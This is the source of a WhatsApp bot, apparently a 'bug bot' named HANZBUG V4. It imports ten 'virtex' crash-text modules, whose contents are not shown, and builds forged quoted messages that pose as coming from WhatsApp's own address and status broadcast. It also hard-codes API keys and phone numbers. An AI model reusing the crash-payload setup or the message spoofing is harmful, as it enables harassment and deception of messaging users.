/*
BASE: https://github.com/Errs404
RECORD: https://github.com/HARISGANZ
HANZ々OFC彡
BASE HANZBUG V4
Wong々Hore Team
Yang Rename Yteam
cd /sdcard && cd BUGV2 && pm2 start main.js && pm2 save && pm2 monit
*/



const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const imgbb = require('imgbb-uploader')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { antiSpam } = require('./lib/antispam')
const { help } = require('./media/help')
const phoneNum = require("awesome-phonenumber");
const { createExif,
modStick 
} = require('./lib/exif')
//~~~~~~~~~~~~~~~~~~~~~[PILTEK]~~~~~~~~~~~~~~~~~~~~~//
const { api } = require('./media/virtex/api')
const { hanz } = require('./media/virtex/Hanz')
const { trava } = require('./media/virtex/trava')
const { virtex1 } = require('./media/virtex/virtex1')
const { virtex2 } = require('./media/virtex/virtex2')
const { virtex3 } = require('./media/virtex/virtex3')
const { virtex4 } = require('./media/virtex/virtex4')
const { virtex5 } = require('./media/virtex/virtex5')
const { virtex6 } = require('./media/virtex/virtex6')
const { virtex7 } = require('./media/virtex/virtex7')
const { virtex8 } = require('./media/virtex/virtex8')
const { virtex9 } = require('./media/virtex/virtex9')
const { virtex10 } = require('./media/virtex/virtex10')
const { ngazap } = require('./media/virtex/ngazap')
const { penawarbug } = require('./media/virtex/penawarbug')
//~~~~~~~~~~~~~~~~~~~~~[BATES COK]~~~~~~~~~~~~~~~~~~~~~//
const { removeBackgroundFromImageFile } = require('remove.bg')
const { fetchJosn, kyun, fetchText } = require('./lib/fetcher')
const { color, bgcolor } = require('./lib/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
//~~~~~~~~~~~~~~~~~~~~~[DATABASE]~~~~~~~~~~~~~~~~~~~~~//
const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const setting = JSON.parse(fs.readFileSync('./media/setting.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
///~~~~~~~~~~~~~~~~~~~~~[STICKER CMD]~~~~~~~~~~~~~~~~~~~~~//
const addCmd = (id, command) => {
const obj = { id: id, chats: command }
scommand.push(obj)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}
const getCommandPosition = (id) => {
let position = null
Object.keys(scommand).forEach((i) => {
if (scommand[i].id === id) {
position = i
}
})
if (position !== null) {
return position
}
}
const getCmd = (id) => {
let position = null
Object.keys(scommand).forEach((i) => {
if (scommand[i].id === id) {
position = i
}
})
if (position !== null) {
return scommand[position].chats
}
}
const checkSCommand = (id) => {
let status = false
Object.keys(scommand).forEach((i) => {
if (scommand[i].id === id) {
status = true
}
})
return status
}
//~~~~~~~~~~~~~~~~~~~~~[SETTING]~~~~~~~~~~~~~~~~~~~~~//
owner = setting.OwnerNumber
botname = setting.BotName
Han = setting.HanzKey
Hankey = setting.hanzKey
ownername = setting.OwnerName
creator = 'Hᴀɴᴢ々Oғᴄ' // GAK USAH DI UBAH
recode = 'Hᴀɴᴢ々Oғᴄ' // UBAH NAMA LU
//~~~~~~~~~~~~~~~~~~~~~[BY HANZ々OFC彡]~~~~~~~~~~~~~~~~~~~~~//
baterai = {
battery: "" || "Not Detect",
isCharge: "" || false
}
publik = true
readG = true 
readP = true
let autovn = false
let ngetik = false
Nogopay = 083144394823
Nodana = 083144394823
Noovo = 083144394823
td = fs.readFileSync("./media/Bot.jpg")
fakeimage = fs.readFileSync("./media/Bot.jpg")
virgam = fs.readFileSync(`./media/virgam.jpeg`)
asutes = 'Wᴏɴɢ々Hᴏʀᴇ Tᴇᴀᴍ[🔥]'
fake = 'ʜᴀɴᴢ々ᴏꜰᴄ️'
//STICK WM
const Creator = "Hanz Ofc";
const watermark = "WM dari Haris/Hanz🗿";
const author = "Haris S";
const packname = "Stick Me";
//APIKEY Ini apikey Gratisan Ntar Kalau gw gabut gua buatin by Haris Awokawok🗿
xteam = 'edd4e2b682326371'
lolkey = '682aeab645ed61cf137cf971'
HunterApi = 'Ikyy69'
lolhuman = 'lolhuman'
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[MODUL EXPROTS]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
module.exports = Hanz = async (Hanz, mek, _welkom) => {
try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
if (!mek.message) return
if (mek.key && mek.key.remoteJid == 'status@broadcast') return	
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
const type = Object.keys(mek.message)[0]  
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
Hanz.on("CB:action,,battery", json => {
const battery = json[2][0][1].value
const persenbat = parseInt(battery)
baterai.battery = `${persenbat}%`
baterai.isCharge = json[2][0][1].live
})
const prefix =  /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'  	      
body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const arg = budy.slice(command.length + 2, budy.length)	
const q = args.join(' ')
const Verived = "0@s.whatsapp.net"
const txt = mek.message.conversation
const botNumber = Hanz.user.jid
const ownerNumber = [`${owner}@s.whatsapp.net`, `6283144394823@s.whatsapp.net`]
const dtod = "6285706035039@s.whatsapp.net"
const otod = "6285706035039@s.whatsapp.net"
const isGroup = from.endsWith('@g.us')
let sender = isGroup ? mek.participant : mek.key.remoteJid
const totalchat = await Hanz.chats.all()
const groupMetadata = isGroup ? await Hanz.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const conts = mek.key.fromMe ? Hanz.user.jid : Hanz.contacts[sender] || { notify: jid.replace(/@.+/, '') }
const pushname = mek.key.fromMe ? Hanz.user.name : conts.notify || conts.vname || conts.name || '-'
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[GROUP]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
const isAntiLink = isGroup ? _antilink.includes(from) : false
const isWelkom = isGroup ? _welkom.includes(from) : false
const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
const isOwner = ownerNumber.includes(sender)
const isMybot = isOwner || mek.key.fromMe
const isBanned = ban.includes(sender)
const isPremier = prem.includes(sender)
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[CONEECTION 1]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
mess = {
premier: `Fitur ini Khusus User Premium!!\nKalo Mau Jadi User Premium\nSilahkan Chat Owner Ku\nWa.me/${owner}`,
wait: '😊 Sɪʟᴀʜᴋᴀɴ Tᴜɴɢɢᴜ',
success: '😬 Bᴇʀʜᴀsɪ',
error: {
stick: '😅 Sɪʟᴀʜᴋᴀɴ Uʟᴀɴɢ Bᴇʙʀᴀᴘᴀ Sᴀᴀᴛ Lᴀɢɪ!',
Iv: '😥 Lɪɴᴋ Eʀʀᴏʀ'
},
only: {
admin: '😑 FIᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ *ADMIN GRUP*',
group: '😑 Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ *GRUP*'
}
}
//ᖴᗩKᗴ Tᗴ᙭T ᗷᑌTTOᑎ
faketeks = 'H͜͡a͜͡n͜͡z͜͡々O͜͡f͜͡c͜͡'
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms));
}
const reply = (teks) => {
Hanz.sendMessage(from, teks, text, {quoted:mek})
}
const sendMess = (hehe, teks) => {
Hanz.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? Hanz.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Hanz.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
}
const zero = fs.readFileSync ('./media/thumnail.jpg')
const costum = (pesan, tipe, target, target2) => {
Hanz.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
}
const runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
};
//ᗷᗩTᗴՏ
var ase = new Date();
var jamss = ase.getHours();
 switch(jamss){
 //WAKTU UCAPAN      
case 0: jamss = "Jangan gadang kak"; break;
  case 1: jamss = "Jangan gadang kak"; break;
     case 2: jamss = "Jangan gadang kak"; break;
        case 3: jamss = "Jangan gadang kak"; break;
            case 4: jamss = "Sholat subuh kak"; break;
               case 5: jamss = "Selamat pagi"; break;
                 case 6: jamss = "Selamat pagi"; break;
                    case 7: jamss = "Selamat pagi"; break;
                       case 8: jamss = "Selamat pagi"; break;
                          case 9: jamss = "Selamat pagi"; break;
                             case 10: jamss = "Selamat pagi"; break;
                               case 11: jamss = "Selamat siang"; break;
                                 case 12: jamss = "sholat Zuhur kak"; break;//GABUT KONTOL🗿
                              case 13: jamss = "Selamat siang"; break;
                           case 14: jamss = "Selamat sore"; break;
                        case 15: jamss = "sholat Ashar kak"; break;
                     case 16: jamss = "Selamat sore"; break;
                  case 17: jamss = "Selamat sore"; break;
               case 18: jamss = "Selamat malam"; break;
            case 19: jamss = "sholat Isya kak"; break;
         case 20: jamss = "Selamat malam"; break;
      case 21: jamss = "Selamat malam"; break;
   case 22: jamss = "Selamat malam"; break;
case 23: jamss = "Selamat malam"; break;
}
//WAKTU/JAM
var tampilUcapan = "" + jamss;
const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const sotoy2 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy1 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','?? : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy3 = ['🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]
const sticOk = (hehe) => {
ano = fs.readFileSync('./media/ok.webp')
Hanz.sendMessage(hehe, ano, sticker, { quoted: ftrol})
}
// Auto Read Group
var chats = await Hanz.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await Hanz.chatRead(jid)
})
// Auto Read Private
var chatss = await Hanz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await Hanz.chatRead(jid)
})
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[REPLY]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
//>>>>>>>> REPLY STICKER<<<<<<<\\
const sticOwner = (hehe) => {
ano = fs.readFileSync('./media/sticker/owner.webp')
Hanz.sendMessage(hehe, ano, sticker, { quoted: mek})
}
const sticNotAdmin = (hehe) => {
ano = fs.readFileSync('./media/sticker/notadmin.webp')
Hanz.sendMessage(hehe, ano, sticker, { quoted: mek})
}
const sticAdmin = (hehe) => {
ano = fs.readFileSync('./media/sticker/admin.webp')
Hanz.sendMessage(hehe, ano, sticker, { quoted: mek})
}
const sticWait = (hehe) => {
ano = fs.readFileSync('./media/sticker/wait.webp')
Hanz.sendMessage(hehe, ano, sticker, { quoted: mek})
}
const sticBanned = (hehe) => {
ano = fs.readFileSync('./media/sticker/banned.webp')
Hanz.sendMessage(hehe, ano, sticker, { quoted: mek})
}
//FAKE REPLY LINK
const replyy = (teks) => {
Hanz.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 500,
isForwarded: true,
sendEphemeral: false,
"externalAdReply": {
"title": `HANZ々OFC彡[BOTZ🎭]`,
"body": "",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.postimg.cc/KcpQgw1r/20211220-190946.jpg",
"thumbnail": fake,
"sourceUrl": `https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw`
},mentionedJid:[sender]}, quoted : mek})
};
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[BUTTON CMD]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
//BUTTON MYTYPE (BY HANZ OFC)
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
Hanz.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};
//BUTTON LOKASI              
const sendButtonLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Hanz.prepareMessage(from, kma, location,{ waitForAck: true })
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Hanz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON TEXT
const sendButton = async (from, context, fortext, but, mek) => {
buttonMessages = {
contentText: context,
footerText: fortext,
buttons: but,
headerType: 1
}
Hanz.sendMessage(from, buttonMessages, buttonsMessage, {
quoted: ftrol
})
}        
//BUTTON DOCUMENT
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await Hanz.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
Hanz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON VIDEO
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Hanz.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Hanz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON FOTO+LINK
const sendButImages = async (from, context, fortext, img, but, mek) => {
ptod = "6285706035039@s.whatsapp.net"
stod = `Hai👋 Saya ${botname}`
jadinya = await Hanz.prepareMessage(from, img, image)
buttonMessagesI = {
imageMessage: jadinya.message.imageMessage,
contentText: context,
footerText: fortext,
buttons: but,
headerType: 4
}
Hanz.sendMessage(from, buttonMessagesI, buttonsMessage, {
quoted: ftrol,
contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`HANZ々OFC彡 [BOTZ🎭]`,body:`SUBSCRIBE HANZ々OFC彡`,mediaType:"2",thumbnail:fakeimage,mediaUrl:`https://www.instagram.com/reel/CYWTXmuJnf2/ugh_Yfb_gii_kontol`,}}
})
}
//BUTTON FOTO
const sendButImage = async (from, context, fortext, img, but, mek) => {
jadinya = await Hanz.prepareMessage(from, img, image)
buttonMessagesI = {
imageMessage: jadinya.message.imageMessage,
contentText: context,
footerText: fortext,
buttons: but,
headerType: 4
}
Hanz.sendMessage(from, buttonMessagesI, buttonsMessage, {
quoted: ftrol,
})
}
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}
//ᗷᑌTTOᑎ ᐯᗴᖇIᖴY
const isRegistered = checkRegisteredUser(sender)

const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
Hanz.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};
const daftar1 = `Hai kak  ${pushname} ${tampilUcapan} \n\nSebeum Menggunakan Bot ${botname} Harap Daftarkan Diri dengan klik Button Verify di bawah ini!`
const daftar2 = 'Dᴀɴ Jᴀɴɢᴀɴ Lᴜᴘᴀ Sᴜʙsᴄʀɪʙᴇ\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nₛᵤBₛCᵣᵢBₑ\nhttps://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬'
const daftar3 = [{buttonId: `${prefix}verify`,buttonText: {displayText: `VERIFY㋡`,},type: 1,},]
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ ᗯᗩᗪᗴᖇᑭᗩK ᗰᗴᑎ ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
//ᖴᗩKᗴ ՏTᗩTᑌՏ
const fakestatus = (teks) => {
Hanz.sendMessage(from, teks, text, {
quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
"mimetype": "image/jpeg",
"caption": faketeks,
"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
"fileLength": "28777",
"height": 1080,
"width": 1079,
"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
"mediaKeyTimestamp": "1610993486",
"jpegThumbnail": fs.readFileSync('./media/thumnail.jpg'),
"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
}
}
}
})
}       
//ᖴᗩKᗴ TᗴOᒪI       
const ftrol = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 2022,
status: 1,
surface : 1,
message: `ʜᴀɴᴢ々ᴏꜰᴄ`, 
orderTitle: `ʜᴀɴᴢ々ᴏꜰᴄ`,
thumbnail: Hanz,
sellerJid: '0@s.whatsapp.net' 
}
}
}
//ᖴᗩKᗴ ᒪOKᗩՏI                   
const floc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
liveLocationMessage: {
caption: `By: メʜᴀɴᴢ ᴏꜰᴄメ`,
jpegThumbnail: Hanz
}
}
}
//ᖴᗩKᗴ ᗪOᑕᑌᗰᗴᑎT                     
const fdoc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
documentMessage: {
title: `By: メʜᴀɴᴢ々ᴏꜰᴄメ`, 
jpegThumbnail: Hanz
}
}
}           
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᑕOᑎᗴᗴᑕTIOᑎ 2]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './stik' + names + '.png', async function () {
console.log('selesai');
let filess = './stik' + names + '.png'
let asw = './stik' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
Hanz.sendMessage(to, media, MessageType.sticker,{quoted:mek})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
Hanz.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})                   
fs.unlinkSync(filename)
});
}   
//ᗩᑎTIᒪIᑎK ᘜᖇOᑌᑭ
if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
replyy(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
console.log(color('[LINK GC DETECT]', 'red'), color('Received a virus text!', 'yellow'))
setTimeout(() => {
Hanz.groupRemove(from, [kic]).catch((e) => { replyy(`BOT HARUS JADI ADMIN`) })
}, 0)
}
//ᗩᑎTI ᐯIᖇTᗴ᙭
if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
replyy('Tandai telah dibaca\n'.repeat(300))
replyy(`「 *VIRTEX DETECTOR* 」\n\nK`)
console.log(color('[VIRTEX DETECT]', 'red'), color('Received a virus text!', 'yellow'))
Hanz.groupRemove(from, [sender])
}
// AUTO
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./media/database/sticker/${anji}.webp`)
					Hanz.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/database/vn/${anju}.mp3`)
					Hanz.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/database/image/${anjh}.jpg`)
					Hanz.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᑕOᑎᗴᗴᑕTIOᑎ 3]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedGif = type === 'extendedTextMessage' && content.includes('gifMessage')
//Տᗴᒪᖴ/ᑭᑌᗷᒪIᑕ
if (!publik) {
if (!isOwner && !mek.key.fromMe) return
}
//ᗩᑌTO ᐯᑎ
if (autovn){
await Hanz.updatePresence(from, Presence.recording)
//ᗩᑌTO KᗴTIK
} else if (ngetik){
await Hanz.updatePresence(from, Presence.composing)
} else {
await Hanz.updatePresence(from, Presence.avaible)
}
if (isCmd && !isGroup) {            
console.log(color('[ CMD PRIVATE ]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'white'), color(`${command} [${args.length}]`, 'cyan'))}          
if (isCmd && isGroup) {           
console.log(color('[ CMD GROUP ]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'white'), color(`${command} [${args.length}]`, 'cyan'), color('from', 'greenyellow'), color(`${pushname}`, 'yellow'), color('in', 'greenyellow'), color(`${groupName}`, 'gold'))}
